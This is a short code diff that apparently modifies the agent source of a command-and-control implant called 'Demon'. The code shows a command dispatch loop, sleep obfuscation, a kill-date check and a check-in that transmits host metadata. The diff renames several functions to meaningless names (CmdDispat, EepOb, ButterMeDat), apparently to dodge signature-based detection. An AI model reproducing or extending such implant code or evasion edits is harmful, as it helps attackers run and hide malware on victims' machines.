@@ -45,7 +45,7 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
 // TODO: rewrite this part
 //       and move it into the Demon.c file
 //
-VOID CommandDispatcher( VOID )
+VOID CmdDispat( VOID )
 {
     PARSER   Parser         = { 0 };
     LPVOID   DataBuffer     = { 0 };
@@ -63,7 +63,7 @@ VOID CommandDispatcher( VOID )
             break;
         }
 
-        SleepObf();
+        EepOb();
 
         if ( ReachedKillDate() ) {
             KillDate();
@@ -166,7 +166,7 @@ VOID CommandCheckin( PPARSER Parser )
 
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_CHECKIN );
 
-    DemonMetaData( &Package, FALSE );
+    ButterMeDat( &Package, FALSE );
 
     PackageTransmit( Package );
 }
